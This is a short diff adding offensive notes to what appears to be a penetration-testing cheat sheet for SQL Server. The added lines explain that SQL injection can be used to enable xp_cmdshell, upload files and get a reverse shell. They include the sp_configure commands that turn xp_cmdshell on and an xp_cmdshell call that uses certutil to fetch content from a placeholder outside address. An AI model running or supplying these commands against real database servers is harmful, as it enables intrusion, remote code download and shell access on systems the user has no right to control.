@@ -84,6 +84,19 @@ NULL
 (return status = 0)
 
 
+#Enable xp_cmdshell
+#If SQLI is present can enable shell then upload files
+#Can also base64 the result
+#try mandros.py (Reverse MSSQL shell)
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+
+
+#Make https requests
+EXEC xp_cmdshell 'certutil -urlcache -f https://x.x.x.x';--
+
+
 #mysql
 
 
